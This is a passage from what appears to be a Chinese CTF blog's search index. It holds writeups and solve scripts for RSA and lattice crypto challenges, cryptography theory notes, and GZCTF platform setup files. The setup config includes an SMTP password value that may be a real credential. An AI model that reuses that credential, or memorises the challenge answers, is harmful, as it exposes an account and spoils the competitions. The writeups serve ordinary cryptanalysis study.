123456789a = [3976,5728,5640,4232,5272,3776,6464\t,6136,5408]b = [876,1147,1182,824,1082,866,1361,1278,1087]c = [16511,24822,26991,11999,21215,16374,37800,32739,21505]for index in range(9): for i in range(32,127): for j in range(32,127): for k in range(32,127): if (i &lt;&lt; 3) + (j &lt;&lt; 4) + (k &lt;&lt; 5) == a[index] and i*3+j*4+k*5 == b[index] and i*j+j*k+k*i == c[index]: print(chr(i)+chr(j)+chr(k),end=&quot;&quot;)"},{"title":"编码与古典密码","path":"/posts/2e2fc6fb.html","content":"常见工具 CyberChef 地址：https://github.com/gchq/CyberChef 随波逐流 CTF编码工具 地址：http://1o1o.xyz/ 编码 ascii码 ASCII（发音：，American Standard Code for Information Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统。它主要用于显示现代英语，而其扩展版本延伸美国标准信息交换码则可以部分支持其他西欧语言，并等同于国际标准ISO/IEC 646。 ASCII 由电报码发展而来。第一版标准发布于1963年 ，1967年经历了一次主要修订[5][6]，最后一次更新则是在1986年，至今为止共定义了128个字符；其中33个字符无法显示（一些终端提供了扩展，使得这些字符可显示为诸如笑脸、扑克牌花式等8-bit符号），且这33个字符多数都已是陈废的控制字符。控制字符的用途主要是用来操控已经处理过的文字。在33个字符之外的是95个可显示的字符。用键盘敲下空白键所产生的空白字符也算1个可显示字符（显示为空白）。 ascii码对照表：https://blog.csdn.net/yueyueniaolzp/article/details/82178954 Hex 十六进制（简写为 hex 或下标 16）是一种基数为 16 的计数系统，是一种逢 16 进 1 的进位制。通常用数字 0、1、2、3、4、5、6、7、8、9 和字母 A、B、C、D、E、F（a、b、c、d、e、f）表示，其中: A~F 表示 10~15，这些称作十六进制数字。 base64编码 基于64个可打印的字符来表示二进制的数据的一种方法。 在使用base64时，需要先定义一串字符串，ABCD……abcd……1234……+/，以上为base64的索引表，在进行编码后也会出现=，==，这是由于补位的需要出现的。 原理： 1.将待转换的字符每三个字节分为一组，一个字节占8个bit，共有24bit。 2.将24个bit每6个分为一组，共4组 3.在每组前加两个0，每组由6个bit变为8个bit，共32bit，即4字节 4.根据每个字节的10进制数在开头定义的字符串中找对照。 如图，对ABC进行编码时，先将其转为ascii码，分别为65，66，67，再更换为二进制为01000001，01000010，01000011.将其分为4组后在前面加上00，为00010000，00010111，00001001，00000011 。转为索引就是16，20，9，3，在开头的字符串中进行索引得到QUJD。 以上为满足分为3个字节时，不满足3个字节时 以一个字节为例，当缺少两个字节时，第二组缺少2位，所以对其补上0，会得到2个base编码，而后两组没有数据，所以用=补上，这也就是base64由64个字符组成，最后会出现“=”号的原因。"},{"title":"LitCTF2024","path":"/posts/3814da5f.html","content":"[toc] Crypto little_fermat 题目： 1234567891011121314151617181920from Crypto.Util.number import *from sympy import *from secret import flag,gen_xm = bytes_to_long(flag)e = 65537p = getPrime(512)q = nextprime(p)n = p * qx = gen_x(p)assert pow(666666, x, p) == 1m = m ^ xc = pow(m, e, n)print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;) 题目描述： Do you know fermat? 解题思路： 根据断言判断为费马小定理 ap−1≡1 (mod p)a^{p-1}\\equiv 1\\ (mod \\ p) ap−1≡1 (mod p) 所以x= p-1 根据给出数据解出m后异或即可 little_fermat_plus 题目： 123456789101112131415161718192021from Crypto.Util.number import *from sympy import *from secret import flag,gen_xm = bytes_to_long(flag)e = 65537p = getPrime(512)q = nextprime(p)n = p * qx = gen_x(p)assert pow(666666, x, p) == 1 ** 1024m = m ^ xc = pow(m, e, n)print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;c = &#123;c&#125;&#x27;) 题目描述： caution difference 解题思路： 费马小定理扩展，原本的费马定理长这样 ap−1≡1 (mod p)a^{p-1} \\equiv 1 \\ (mod\\ p) ap−1≡1 (mod p) 在对两边取1024次方后长这样 a1024∗（p−1）≡11024 (mod p)a^{1024*（p-1）}\\equiv 1^{1024}\\ (mod\\ p) a1024∗（p−1）≡11024 (mod p) 所以根据断言，x = 1024*（p-1） 求出m后异或x即可 common_primes 题目： 1234567891011121314151617from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)e = 65537p = getPrime(512)q1 = getPrime(512)q2 = getPrime(512)n1 = p * q1n2 = p * q2c1 = pow(m, e, n1)c2 = pow(m, e, n2)print(f&quot;n1 = &#123;n1&#125;&quot;)print(f&quot;n2 = &#123;n2&#125;&quot;)print(f&quot;c1 = &#123;c1&#125;&quot;)print(f&quot;c2 = &#123;c2&#125;&quot;) 题目描述： OK,it’s your common primes 解题思路： gcd(n1,n2)=pgcd(n1,n2) = p gcd(n1,n2)=p common_primes_plus 题目描述： It’s not hard,trust me 题目： 123456789101112131415161718192021from Crypto.Util.number import *from secret import flag,a,b,c,dassert a*c == b*d + 1m = bytes_to_long(flag)e = 65537p = getPrime(512)q1 = getPrime(512)q2 = getPrime(512)n1 = p * q1n2 = p * q2hint1 = a * n1 + b * n2hint2 = c * n1 + d * n2c = pow(m,e,n1)print(f&quot;n1 = &#123;n1&#125;&quot;)print(f&quot;hint1 = &#123;hint1&#125;&quot;)print(f&quot;hint2 = &#123;hint2&#125;&quot;)print(f&quot;c = &#123;c&#125;&quot;) 解题思路： 根据定理，由于a,b,c,d互素，ac-bd=1。所以 gcd(hint1,hint2)=gcd(n1,n2)=pgcd(hint1,hint2) = gcd(n1,n2) = p gcd(hint1,hint2)=gcd(n1,n2)=p 得到p后常规rsa CRT 题目描述： 有物不知其数，三三数之剩二，五五数之剩三，七七数之剩二。问物几何？ 题目： 123456789101112131415161718from Crypto.Util.number import *from secret import flagm = bytes_to_long(flag)e = 10n_list = []c_list = []for i in range(10): p = getPrime(1024) q = getPrime(1024) n = p * q c = pow(m,e,n) n_list.append(n) c_list.append(c)print(f&quot;n_list = &#123;n_list&#125;&quot;)print(f&quot;c_list = &#123;c_list&#125;&quot;) 解题思路： 常规CRT脚本 CRT_plus 题目描述： 也许要在老祖宗留下来的基础上改变一下 题目： 12345678910111213141516171819202122232425from Crypto.Util.number import *import randomfrom secret import flagm = bytes_to_long(flag)e = 5A = [random.randint(1, 128) for i in range(e)]B = [random.randint(1, 1024) for i in range(e)]C = []N = []for i in range(e): p = getPrime(1024) q = getPrime(1024) n = p * q c = pow(A[i] * m + B[i], e, n) N.append(n) C.append(c)print(f&#x27;A = &#123;A&#125;&#x27;)print(f&#x27;B = &#123;B&#125;&#x27;)print(f&#x27;C = &#123;C&#125;&#x27;)print(f&#x27;N = &#123;N&#125;&#x27;) 解题思路： smell_e 题目描述： I spilt the flag into several blocks,can you solve the problem? 题目： 123456789101112131415161718from Crypto.Util.number import *import libnumfrom gmpy2 import irootn = ……c_list = [……]e=3flag= b&quot;&quot;for i in c_list: k = 0 while 1: res = iroot(i+k*n,e) #c+k*n 开3次方根 能开3次方即可 #print(res) #res = (mpz(13040004482819713819817340524563023159919305047824600478799740488797710355579494486728991357), True) if(res[1] == True): flag += libnum.n2s(int(res[0])) break k=k+1print(flag) 解题思路： 小e，直接开方即可 smell_e_plus 题目描述： You need to change your mind 题目： 123456789101112131415from Crypto.Util.number import *import randomfrom secret import flage = random.randint(1000,2000)p = getPrime(1024)q = getPrime(1024)n = p * qc_list = []for m in flag: c_list.append(pow(ord(m),e,n))print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;c_list = &#123;c_list&#125;&quot;) 解题思路： 首先确定flag的开头为L，已知e的范围，在遍历e的情况下对“L”进行加密，得到e的值。随后对每个字符都进行爆破，依次得到flag的每个字符。 EasyRSA 题目描述： 怎么说呢，就……真的挺简单的 题目： 123456789from Crypto.Util.number import *from secret import flagp=getPrime(256)print(p)n=p**4m=bytes_to_long(flag)e=65537c=pow(m,e,n)print(c) 解题思路： n为p的4次方，对n直接开方得到p，phi=p4−p3phi = p^4-p^3phi=p4−p3 解得m后，发现为fake flag，并给出了hint。多次尝试发现hint为q，与上一步p相乘得到n，求解c2","tags":["wp","litctf"]},{"title":"格密码","path":"/posts/6648c7c.html","content":"理论基础 格理论的起源可以追溯到 17 世纪有关球堆积问题的研究，直至 1840 年，高 斯才引入格在几何中的概念并给出了三维空间中球的最大堆积密度。格在群论和几何中的定义不同于离散数学中有关偏序集合的描述，几何上，可以将格看作是具有周期性结构的 n 维空间中的点的集合。 Shamir最早将格理论引入密码学领域，其在 1982 年利用格对背包公钥密码体制进行了攻击，后来 Coppersmith对其分析方法做了推广，将破解 RSA 公钥密码体制的问题转化成了求格中的困难问题。近些年，随着对格理论中有关计算性难题的研究，人们发现其在数论、计算机科学、密码分析和设计中都有着很* 广泛的应用前景。 格的定义 设b1,b2,...,bn∈Rmb_1,b_2,...,b_n\\in \\mathbb{R}^mb1​,b2​,...,bn​∈Rm一组线性无关的向量，其产生的格被定义为 L(b1,b2,...,bn)={Σi=1nxibi∣xi∈Z}L(b_1,b_2,...,b_n) = \\{ \\Sigma^n_{i=1}x_ib_i|x_i\\in\\mathbb{Z}\\} L(b1​,b2​,...,bn​)={Σi=1n​xi​bi​∣xi​∈Z} ​\t简记为L，m为格L的维数，n为格L的秩，通常研究满秩格，即m=n。称B={b1,b2,..,bn}B=\\{b_1,b_2,..,b_n\\}B={b1​,b2​,..,bn​}为一组格基，同一个格L可以由不同的格基来表示。 ​\t上图展示了由基向量{b0,b1}\\{b_0,b_1\\}{b0​,b1​}或{v0,v1}\\{v_0,v_1\\}{v0​,v1​}生成的二维格。 ​\t在给定格L中的任意一组基向量，将其以行向量的形式表达为矩阵A，通过对A左乘一个幺模矩阵U≠IU eq IU​=I（如果A∈Rm×nA \\in R ^{m\\times n}A∈Rm×n是整数矩阵，r=rank(A)=min{m,n}而且A的所有非零rxr子式等于1或-1，则称A为幺模矩阵）得到矩阵UA，UA的行向量则表示格L的另外一组基。 ​\t一般来说，如果一组基向量几乎是正交的，那么认为它是好的基向量，否则认为是坏的。如上图，{b0,b1}\\{b_0,b_1\\}{b0​,b1​}是一组好的基向量，{v0,v1}\\{v_0,v_1\\}{v0​,v1​}是一组坏的基向量，基向量正交的程度直接影响解决格问题的复杂程度。 格的延展空间 设n维格L(B),其基向量B的所有线性组合形成的集合 span(B)={Bx∣x∈Rn}span(B) = \\{Bx|x\\in \\mathbb{R}^n \\} span(B)={Bx∣x∈Rn} 称为这组基向量的延展空间 格的延展空间为整个n维空间的前提是为满秩格 格的基本空间 设n维格L(B),以下向量的集合 P(B)={Bx∣x∈Rn,∀i:0≤xi≤1}P(B) = \\{Bx|x\\in\\mathbb{R}^n,\\forall i:0\\le x_i\\le1\\} P(B)={Bx∣x∈Rn,∀i:0≤xi​≤1} 称为格L的一个基础区域。","tags":["Crypto"]},{"title":"HZNUCTF2024","path":"/posts/256e8762.html","content":"HZNUCTF2024 ez_encode cyberchef 一把嗦了 sign-up 12345678910111213141516from gmpy2 import *from Crypto.Util.number import *from secret import flagp=getPrime(1024)q=next_prime(p+(p&gt;&gt;500))e=0x10001n=p*qc=pow(bytes_to_long(flag),e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c) 其中q=next_prime(p+(p&gt;&gt;500))指的是：$ q= [p+\\frac{1}{2^{500}}p] +r $ 即 $ q = [(1+\\frac{1}{2^{500}}p] +r $, r是为了将q凑为质数的整数。 $ \\therefore n = p\\ast q = [(1+ \\frac{1}{2^{500}})p^2]+rp$ $ \\therefore (1+\\frac{1}{2^{500}})n = ((1+ \\frac{1}{2^{500}})p)^2 + (1+\\frac{1}{2^{500}})rp &gt; ((1+\\frac{1}{2^{500}})p)^2 ——①$ ∵q2=[(1+12500)p+r]2=((1+12500)p)2+2[(1+12500)rp]+r2——②\\because q^2 = [(1+\\frac{1}{2^{500}})p + r]^2 = ((1+\\frac{1}{2^{500}})p)^2 + 2[(1+\\frac{1}{2^{500}})rp] + r^2 ——②∵q2=[(1+25001​)p+r]2=((1+25001​)p)2+2[(1+25001​)rp]+r2——② 易知，②式大于①式 ∴经过比较得[(1+12500)p]2&lt;[(1+12500)n]&lt;[(1+12500)p+r]2\\therefore 经过比较得 [(1+\\frac{1}{2^{500}})p]^2 &lt; [(1+\\frac{1}{2^{500}})n]&lt; [(1+\\frac{1}{2^{500}})p + r]^2∴经过比较得[(1+25001​)p]2&lt;[(1+25001​)n]&lt;[(1+25001​)p+r]2 通过开方缩小范围得 $(1+\\frac{1}{2^{500}})p &lt; \\sqrt{(1 + \\frac{1}{2^{500}})n} &lt; (1+\\frac{1}{2^{500}})p +r = q $ 所以，(1+12500)n\\sqrt{(1+\\frac{1}{2^{500}})n}(1+25001​)n​的下一个素数即为q q = next_prime(iroot((n + (n &gt;&gt; 500)), 2)[0]) ez_rsa 1234567891011121314151617181920from Crypto.Util.number import *from flag import flagdef keygen(nbit = 32):\twhile True: k = getRandomNBitInteger(nbit) p = 3*k**17 + 3*k**11 - 53*k**7 + 12*k**5 - 114*k + 27329 q = 5*k**13 - 7*k**11 + 43*k**5 - 313*k**3 - 14*k + 18869 if isPrime(p) and isPrime(q): return p, qdef encrypt(msg, n, e = 65537):\tm = bytes_to_long(msg)\treturn pow(m, e, n)p, q = keygen()n = p * qenc = encrypt(flag, n)print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;enc = &#123;enc&#125;&#x27;) 根据题目得到一个关于k的多项式方程组 用sage求解多项式 1234567var(&#x27;k&#x27;)p = 3*k**17 + 3*k**11 - 53*k**7 + 12*k**5 - 114*k + 27329q = 5*k**13 - 7*k**11 + 43*k**5 - 313*k**3 - 14*k + 18869eq=p*q==nsolve(eq,[k]) 即可求得k，再求得p，q解一般rsa即可 你知道什么叫第二重要极限吗？ a=lim⁡x→0(a1x+a2x+⋯+anxn)nxa = \\lim_{x \\to 0} (\\frac{a_1^x+a_2^x+\\cdots+a_n^x}{n})^{\\frac{n}{x}} a=x→0lim​(na1x​+a2x​+⋯+anx​​)xn​ 你知道什么叫做第二重要极限吗？ 其中 123a_i = [1,9,9,8,4,6,1,9,9,4,8,1,4] flag=&quot;HZNUCTF&#123;&quot;+md5(res)+&quot;&#125;&quot; 使用在线工具求得极限后md5加密即可","tags":["writeup","CTF","HZNUCTF2024"],"categories":["Writeup"]},{"title":"纠错码理论及基于纠错码的公钥密码体制","path":"/posts/f97bfe36.html","content":"纠错码理论 ​ 纠错码一开始应用于数字通信系统，目的是使消息可以在信道中可靠的传输而不产生错误，其通过在消息中增加冗余的方法，排除噪声信道下带来的干扰，从而使接收方能够正确的检测或纠正错误 分类： 线性分组码 线性卷积码 非线性卷积码等 密码学中常用线性分组码 定义1（线性分组码）： 二进制(n, k)线性分组码 C 是 GF(2)上的 n 维线性空间的一个 k 维子空间。n 表示码字的长度，k 表示消息位的长度。 定义2 （生成矩阵，校验矩阵）: 对于(n, k)线性分组码 C，对于(n, k)线性分组码 C，若矩阵G∈F2k×nG \\in F_2^{k \\times n}G∈F2k×n​满足 C={mG∣m∈F2k}C = \\{mG|m \\in F_2^k\\} C={mG∣m∈F2k​} 称矩阵G为码C的生成矩阵。 可见，码字空间是矩阵G的行的线性组合张成的子空间，对G做初等变换有G=[IkP]G=[I_kP]G=[Ik​P],IkI_kIk​是k阶的单位阵，P是大小为k×(n−k)k\\times (n-k)k×(n−k)的矩阵，由该G生成的码称为系统码，且系统码的前k位是信息位，后(n−k)(n-k)(n−k)位是校验位。 若矩阵H∈F2(n−k)×nH \\in F_2^{(n-k)\\times n}H∈F2(n−k)×n​满足 C={c∈F2n∣HcT=0}C= \\{c\\in F_2^n|Hc^T=0\\} C={c∈F2n​∣HcT=0} 称矩阵H为码C的校验矩阵 定义3 （校验子）： 设向量c∈F2nc\\in F_2^nc∈F2n​,校验矩阵H∈F2(n−k)×nH\\in F_2^{(n-k)\\times n}H∈F2(n−k)×n​。若向量s∈F2n−ks\\in F_2^{n-k}s∈F2n−k​有 sT=HcT∈F2n−ks^T = Hc^T\\in F_2^{n-k} sT=HcT∈F2n−k​ 称s为向量c的校验子。当码字正确是，校验子为0向量。 定义4 （汉明重量）： 设向量c∈F2nc\\in F_2^{n}c∈F2n​,汉明重量指向量中非0元素的个数，记作w(c)w(c)w(c) 定义5 （汉明距离）： 设向量a,b∈F2na,b \\in F_2^na,b∈F2n​,汉明距离指对应位置不同元素的个数，记作d(a,b)=w(a−b)d(a,b)=w(a-b)d(a,b)=w(a−b) 定义6 （最小距离）： 设线性分段码C，∀c1,c2∈C\\forall c_1,c_2\\in C∀c1​,c2​∈C且c1≠c2c_1 eq c_2c1​​=c2​，最小距离记作dmin=min d(c1,c2)d_{min}= min\\ d(c_1,c_2)dmin​=min d(c1​,c2​)。其等价于线性分组码C中非零码字的最小汉明重量，即c∈C,c≠0,dmin=min w(c)c\\in C,c eq0,d_{min} = min\\ w(c)c∈C,c​=0,dmin​=min w(c)。 若一个(n,k)线性分组码的最小距离为dmind_{min}dmin​，则 检测出e个随机错误，需满足dmin≥e+1d_{min}\\ge e+1dmin​≥e+1 纠正出t个随机错误，需满足dmin≥2t+1d_{min} \\ge 2t +1dmin​≥2t+1 纠正出t个随机错误，且检测出e个随机错误，其中e≥te \\ge te≥t，需满足dmin≥e+t+1d_{min} \\ge e+t+1dmin​≥e+t+1 下文将以(n,k,d)表示线性分组码，其中d表示dmind_{min}dmin​ 定义7 （等价类）： 设(n,k,d)线性分组码C1C_1C1​和C2C_2C2​，置换C1C_1C1​中的n个码元位置并加一个不变的n维向量a后能够得到C2C_2C2​，称C1C_1C1​与C2C_2C2​属于一个等价类。即 C2∈{π(u)+a,u∈C1}C_2 \\in \\{ \\pi(u)+a,u\\in C_1\\} C2​∈{π(u)+a,u∈C1​} 对C1C_1C1​和C2C_2C2​而言，判断二者是否为同一等价类等价于寻找k阶满秩方阵S和n阶置换矩阵P，使得C1C_1C1​的生成矩阵G1G_1G1​和C2C_2C2​的生成矩阵G2G_2G2​满足 G1=SG2PG_1 = SG_2P G1​=SG2​P 若满足上式，则代表C1C_1C1​与C2C_2C2​等价。","tags":["后量子密码","公钥密码"]},{"title":"GZCTF搭建笔记","path":"/posts/fd19c595.html","content":"新建用户 为了方便管理，新建一个用户进行操作 1sudo adduser GZCTF 给用户赋予使用docker的权限 1sudo usermod -aG docker GZCTF 配置文件 新建appsettings.json 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&#123; &quot;AllowedHosts&quot;: &quot;*&quot;, &quot;ConnectionStrings&quot;: &#123; &quot;Database&quot;: &quot;Host=db:5432;Database=gzctf;Username=postgres;Password=&lt;String1&gt;&quot; //&lt;String1&gt;换成数据库密码，随机密码且长度足够 &#125;, &quot;Logging&quot;: &#123; &quot;LogLevel&quot;: &#123; &quot;Default&quot;: &quot;Information&quot;, &quot;Microsoft&quot;: &quot;Warning&quot;, &quot;Microsoft.Hosting.Lifetime&quot;: &quot;Information&quot; &#125; &#125;, //邮箱配置 &quot;EmailConfig&quot;: &#123; &quot;SendMailAddress&quot;: &quot;Admin@xxx.com&quot;, // 填入邮箱 &quot;UserName&quot;: &quot;ctf_noreply&quot;, // 发件人名称 &quot;Password&quot;: &quot;UWPTINWMFPQVMPAH&quot;, // 邮箱密码，部分服务商需要填入授权码 &quot;Smtp&quot;: &#123; &quot;Host&quot;: &quot;smtp.163.com&quot;, // 此处为163邮箱服务器，具体自定 &quot;Port&quot;: 465 &#125; &#125;, &quot;XorKey&quot;: &quot;&lt;String2&gt;&quot;, // 自定XorKey &quot;ContainerProvider&quot;: &#123; &quot;Type&quot;: &quot;Docker&quot;, &quot;PublicEntry&quot;: &quot;xx.xx.xx.xx&quot;, // 域名或IP配置，用于容器生成,域名不带http/https &quot;DockerConfig&quot;: &#123; &quot;SwarmMode&quot;: false, &quot;Uri&quot;: &quot;&quot; // 本地配置Docker因此此处置空 &#125; &#125;, &quot;RequestLogging&quot;: false, &quot;DisableRateLimit&quot;: false, &quot;RegistryConfig&quot;: &#123; &quot;UserName&quot;: &quot;&quot;, &quot;Password&quot;: &quot;&quot;, &quot;ServerAddress&quot;: &quot;&quot; &#125;, //谷歌验证码配置 &quot;GoogleRecaptcha&quot;: &#123; &quot;VerifyAPIAddress&quot;: &quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;, &quot;Sitekey&quot;: &quot;&quot;, &quot;Secretkey&quot;: &quot;&quot;, &quot;RecaptchaThreshold&quot;: &quot;0.5&quot; &#125;&#125; 新建docker-compose.yml 12345678910111213141516171819202122232425262728293031323334353637version: &#x27;3.0&#x27;services: gzctf: image: gztime/gzctf:latest restart: always environment: - &quot;GZCTF_ADMIN_PASSWORD=&lt;String3&gt;&quot; # &lt;String3&gt;换成管理员账户密码，账号为Admin ports: - &quot;80:80&quot; # 对外端口号，前为外部端口。 networks: default: volumes: - &quot;./data/files:/app/uploads&quot; - &quot;./appsettings.json:/app/appsettings.json:ro&quot; - &quot;./logs:/app/log&quot; - &quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot; # - &quot;./k8sconfig.yaml:/app/k8sconfig.yaml:ro&quot; - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; depends_on: - db db: image: postgres:alpine restart: always environment: - &quot;POSTGRES_PASSWORD=&lt;String1&gt;&quot; # 数据库密码，务必要和appsettings.json中的配置一致 networks: default: volumes: - &quot;./data/db:/var/lib/postgresql/data&quot;networks: default: driver: bridge ipam: config: - subnet: 192.168.12.0/24 运行容器 1docker-compose up -d 报错解决","tags":["GZCTF"],"categories":["平台搭建"]},{"title":"SICTF-Round3-Crypto-WP","path":"/posts/40fc9503.html","content":"[签到]Vigenere 维吉尼亚爆破密钥 签到，确信！ 123456789101112131415161718from Crypto.Util.number import *from gmpy2 import *n = 8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331e = 65537c = 990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383R = Zmod(n)[&quot;x&quot;]while True: Q = R.quo(R.random_element(7)) p = gcd(ZZ(list(Q.random_element() ^ n)[1]),n) if p!=1: q = sum([p**i for i in range(7)]) r=n//(p*q) assert n==p*q*r breakphi=(p-1)*(q-1)*(r -1)d = pow(e,-1,phi)m = pow(c,d,n)print(long_to_bytes(int(m))) 创建n的多项式环循环查找n的因数 得到p，q，r后计算phi解flag SuperbRSA 共模攻击，但e1，e2 不互素，套脚本 12345678910111213141516171819from Crypto.Util.number import *from gmpy2 import *n= 19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023c1= 276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529c2= 11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021e1=55e2=200g,x,y=gmpy2.gcdext(e1,e2)m1=pow(c1,x,n)*pow(c2,y,n)%nx = gmpy2.gcd(e1,e2)k = 0while 1: m11 = m1 + k*n m,s = gmpy2.iroot(m11,x) if s: print(long_to_bytes(m)) break k += 1 easyLattice 格密码 NTRU 由于f的bit大，需要给p，h加上大系数k 1234567from Crypto.Util.number import *h = 9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443p = 11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947 M = matrix([[1,(2**245)*h],[0,(2**245)*p]])f,g = M.LLL()[0]flag = abs(f)print(long_to_bytes(flag))","tags":["writeup","CTF","SICTF"],"categories":["Writeup"]},{"title":"NSSCTF_Round_#17-Crypto-WP","path":"/posts/bada0932.html","content":"Level_1 题目： 123456789101112131415161718192021#真签到题from Crypto.Util.number import bytes_to_long, getPrimefrom secret import getflage1 = getPrime(1024)e2 = getPrime(1024)n = e1 * e2m = bytes_to_long(getflag().encode())c1 = pow(m, e1, n)c2 = pow(m, e2, n)print(n)print(c1)print(c2)print(e1)print(e2)# n = 22517647586235353449147432825948355885962082318127038138351524894369583539246623545565501496312996556897362735789505076324197072008392656511657262430676945685471397862981216472634785622155317188784494912316440866051402627470561626691472280850273482836308002341429493460677206562201947000047718275995355772707947408688836667011206588727438261189233517003341094758634490421007907582147392858070623641389171229435187248184443645883661560636995548332475573072064240073037558031928639832259001407585962782698021735648128101459118863015844905452823095147248865104102562991382119836061161756978764495337874807458182581421229# c1 = 1432393096266401187029059077791766305797845826173887492889260179348416733820890797101745501984437201566364579129066414005659742104885321270122634155922766503333859812540068278962999824043206496595825886026095484801291802992082454776271149083516187121160475839108002133113254134626407840182541809478892306748590016896975053434021666376203540725254480252049443975835307793528287818262102688334515632062552114342619781840154202525919769192765621085008206581226486157149883898548933475155236509073675387541466324512294079413938239828341890576923100769181401944289365386552139418728492565319685207500539721582552448971814# c2 = 13299679392897297864252207869444022461237574801991239380909482153705185317634241850084078027230394830079554676426505967970943836811048777462696506309466535820372917756458083553031417406403895116557560548183674144457502601887632495739472178857537011190162283185735114683172731936834993707871636782206418680404006299140864001776588991141011500807549645227520128216130966268810165946959810884593793452437010902774726405217517557763322690215690606067996057037379898630878638483268362526985225092000670251641184960698506349245915816808028210142606700394584541282682338561482561343076218115042099753144875658666459825545602# e1 = 155861690390761931560700906834977917646203451142415617638229284868013723431003139974975998354830978765979365632120896717380895021936387027045347260400512396388028781862427862974453223157509702913026222541667006325100878113871620322023188372501930117363623076837619478555007555970810681502521309925774889678793# e2 = 144471983652821947847253052623701746810204736865723159569786739658583884214397562204788127484897909964898113250509653721265240138487697822089282456150238116811225975640330930854549232972314642221382625614304415750165289831040623741828600283778523993251940904896081111235859249916040849697146542311990869696453 明显共模攻击，直接套模板 exp: 123456789101112from Crypto.Util.number import *from gmpy2 import *n = 22517647586235353449147432825948355885962082318127038138351524894369583539246623545565501496312996556897362735789505076324197072008392656511657262430676945685471397862981216472634785622155317188784494912316440866051402627470561626691472280850273482836308002341429493460677206562201947000047718275995355772707947408688836667011206588727438261189233517003341094758634490421007907582147392858070623641389171229435187248184443645883661560636995548332475573072064240073037558031928639832259001407585962782698021735648128101459118863015844905452823095147248865104102562991382119836061161756978764495337874807458182581421229c1 = 1432393096266401187029059077791766305797845826173887492889260179348416733820890797101745501984437201566364579129066414005659742104885321270122634155922766503333859812540068278962999824043206496595825886026095484801291802992082454776271149083516187121160475839108002133113254134626407840182541809478892306748590016896975053434021666376203540725254480252049443975835307793528287818262102688334515632062552114342619781840154202525919769192765621085008206581226486157149883898548933475155236509073675387541466324512294079413938239828341890576923100769181401944289365386552139418728492565319685207500539721582552448971814c2 = 13299679392897297864252207869444022461237574801991239380909482153705185317634241850084078027230394830079554676426505967970943836811048777462696506309466535820372917756458083553031417406403895116557560548183674144457502601887632495739472178857537011190162283185735114683172731936834993707871636782206418680404006299140864001776588991141011500807549645227520128216130966268810165946959810884593793452437010902774726405217517557763322690215690606067996057037379898630878638483268362526985225092000670251641184960698506349245915816808028210142606700394584541282682338561482561343076218115042099753144875658666459825545602e1 = 155861690390761931560700906834977917646203451142415617638229284868013723431003139974975998354830978765979365632120896717380895021936387027045347260400512396388028781862427862974453223157509702913026222541667006325100878113871620322023188372501930117363623076837619478555007555970810681502521309925774889678793e2 = 